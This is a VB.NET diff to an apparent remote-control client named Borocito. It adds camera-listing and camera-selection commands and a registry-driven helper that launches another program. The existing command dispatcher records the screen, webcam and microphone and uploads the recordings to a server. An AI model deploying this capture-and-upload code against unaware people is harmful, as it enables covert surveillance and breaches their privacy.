@@ -7,7 +7,7 @@ Module GlobalUses
 End Module
 Module Utility
     Public tlmContent As String
-    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
+    Function AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False) As String
         Try
             Dim OverWrite As Boolean = False
             If My.Computer.FileSystem.FileExists(DIRHome & "\" & My.Application.Info.AssemblyName & ".log") Then
@@ -24,10 +24,33 @@ Module Utility
                 My.Computer.FileSystem.WriteAllText(DIRHome & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
             Catch
             End Try
+            Return finalContent & "[" & from & "]" & content
         Catch ex As Exception
             Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
+            Return "[AddToLog@Utility]Error: " & ex.Message
         End Try
-    End Sub
+    End Function
+    Function BoroHearInterop(Optional ByVal content As String = Nothing) As Boolean
+        Try
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
+            If regKey Is Nothing Then
+                Return False
+            Else
+                Try
+                    If content <> Nothing Then
+                        AddToLog("BoroHearInterop", content, False)
+                        Process.Start(regKey.GetValue("boro-hear"), content)
+                    End If
+                    Return True
+                Catch
+                    Return False
+                End Try
+            End If
+        Catch ex As Exception
+            Console.WriteLine("[BoroHearInterop@Init]Error: " & ex.Message)
+            Return False
+        End Try
+    End Function
 End Module
 Module Memory
     Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
@@ -81,14 +104,14 @@ Module StartUp
         Try
             If parametros <> Nothing Then
                 Dim parameter As String = parametros
+                Dim args() As String = parameter.Split(" ")
+
                 If parameter.ToLower Like "*/startscreenrecording*" Then
                     'Comienza a grabar la pantalla
                     Main.StartScreenRecord()
-
                 ElseIf parameter.ToLower Like "*/stopscreenrecording*" Then
                     'Detiene la grabacion de pantalla
                     Main.StopScreenRecord()
-
                 ElseIf parameter.ToLower Like "*/sendscreenrecord*" Then
                     'Detiene y luego envia la grabacion de pantalla
                     Main.UploadFileToServer(Main.SaveScreenRecord())
@@ -96,16 +119,19 @@ Module StartUp
 
                 ElseIf parameter.ToLower Like "*/startcamrecording*" Then
                     'Comienza a grabar la camara
-                    Main.StartCamRecord()
-
+                    BoroHearInterop(Main.StartCamRecord())
                 ElseIf parameter.ToLower Like "*/stopcamrecording*" Then
                     'Detiene la grabacion de la camara
                     Main.StopCamRecord()
-
                 ElseIf parameter.ToLower Like "*/sendcamrecord*" Then
                     'Detiene y luego envia la grabacion de la camara
                     Main.UploadFileToServer(Main.StopCamRecord())
                     End
+
+                ElseIf parameter.ToLower Like "*/camera*" Then
+                    BoroHearInterop(Main.CameraManager(args(1)))
+                ElseIf parameter.ToLower Like "*/getcameras*" Then
+                    BoroHearInterop(Main.GetCameras())
 
                 ElseIf parameter.ToLower Like "*/takecampicture*" Then
                     'Toma una captura de la camara y la envia
@@ -115,12 +141,10 @@ Module StartUp
                 ElseIf parameter.ToLower Like "*/startmicrecording*" Then
                     'Comenzar a grabar microfono
                     Main.StartMicRecord()
-
                 ElseIf parameter.ToLower Like "*/stopmicrecord*" Then
                     'Detiene la grabacion del microfono
                     Main.StopMicRecord()
                     Main.StopMicRecord(True)
-
                 ElseIf parameter.ToLower Like "*/sendmicrecord*" Then
                     'Envia la grabacion del microfono
                     Main.UploadFileToServer(Main.SaveMicRecord)
